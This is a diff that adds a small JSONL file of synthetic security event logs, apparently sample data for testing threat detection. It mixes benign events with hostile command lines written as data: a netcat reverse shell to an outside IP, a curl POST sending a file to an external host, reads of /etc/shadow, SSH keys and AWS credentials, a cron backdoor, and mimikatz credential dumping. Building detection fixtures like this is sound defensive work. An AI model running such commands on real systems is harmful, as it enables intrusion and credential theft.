@@ -1,0 +1,20 @@
+{"timestamp": "2025-01-30T10:00:00Z", "host": "web-server-01", "event_type": "ssh_login_failed", "user": "admin", "source_ip": "192.168.1.10"}
+{"timestamp": "2025-01-30T10:01:00Z", "host": "web-server-01", "event_type": "ssh_login_failed", "user": "root", "source_ip": "192.168.1.10"}
+{"timestamp": "2025-01-30T10:02:00Z", "host": "web-server-01", "event_type": "ssh_login_success", "user": "deployer", "source_ip": "10.0.0.50"}
+{"timestamp": "2025-01-30T10:05:00Z", "host": "db-server-01", "event_type": "process_start", "process_name": "nc", "command_line": "nc -e /bin/sh 45.33.32.156 4444", "user": "www-data"}
+{"timestamp": "2025-01-30T10:06:00Z", "host": "app-server-01", "event_type": "process_start", "process_name": "python", "command_line": "python app.py", "user": "appuser"}
+{"timestamp": "2025-01-30T10:07:00Z", "host": "win-workstation-01", "event_type": "process_start", "process_name": "powershell.exe", "command_line": "powershell.exe -EncodedCommand SGVsbG8gV29ybGQ=", "user": "jsmith"}
+{"timestamp": "2025-01-30T10:08:00Z", "host": "app-server-01", "event_type": "network_connection", "process_name": "curl", "dest_ip": "185.220.101.1", "dest_port": 443}
+{"timestamp": "2025-01-30T10:09:00Z", "host": "app-server-01", "event_type": "file_access", "file_path": "/etc/passwd", "user": "www-data", "action": "read"}
+{"timestamp": "2025-01-30T10:10:00Z", "host": "app-server-01", "event_type": "file_access", "file_path": "/var/log/app.log", "user": "appuser", "action": "read"}
+{"timestamp": "2025-01-30T10:11:00Z", "host": "db-server-01", "event_type": "process_start", "process_name": "bash", "command_line": "sudo cat /etc/shadow", "user": "backup"}
+{"timestamp": "2025-01-30T10:12:00Z", "host": "db-server-01", "event_type": "file_access", "file_path": "/etc/shadow", "user": "root", "action": "read"}
+{"timestamp": "2025-01-30T10:15:00Z", "host": "jump-server-01", "event_type": "process_start", "process_name": "nmap", "command_line": "nmap -sV 10.0.0.0/24", "user": "admin"}
+{"timestamp": "2025-01-30T10:16:00Z", "host": "app-server-02", "event_type": "process_start", "process_name": "curl", "command_line": "curl -X POST https://external-api.com/data -d @/tmp/export.csv", "user": "www-data"}
+{"timestamp": "2025-01-30T10:17:00Z", "host": "app-server-02", "event_type": "crontab_modified", "user": "www-data", "action": "add", "entry": "* * * * * /tmp/backdoor.sh"}
+{"timestamp": "2025-01-30T10:18:00Z", "host": "web-server-01", "event_type": "process_start", "process_name": "apache2", "command_line": "/usr/sbin/apache2 -k start", "user": "root"}
+{"timestamp": "2025-01-30T10:19:00Z", "host": "dev-workstation-01", "event_type": "file_access", "file_path": "/home/dev/.ssh/id_rsa", "user": "attacker", "action": "read"}
+{"timestamp": "2025-01-30T10:20:00Z", "host": "dev-workstation-01", "event_type": "file_access", "file_path": "/home/dev/.aws/credentials", "user": "attacker", "action": "read"}
+{"timestamp": "2025-01-30T10:21:00Z", "host": "app-server-01", "event_type": "network_connection", "process_name": "python", "dest_ip": "10.0.0.100", "dest_port": 5432}
+{"timestamp": "2025-01-30T10:22:00Z", "host": "win-server-01", "event_type": "process_start", "process_name": "mimikatz.exe", "command_line": "mimikatz.exe sekurlsa::logonpasswords", "user": "SYSTEM"}
+{"timestamp": "2025-01-30T10:23:00Z", "host": "win-server-01", "event_type": "process_start", "process_name": "psexec.exe", "command_line": "psexec.exe \\\\dc01 cmd.exe", "user": "admin"}
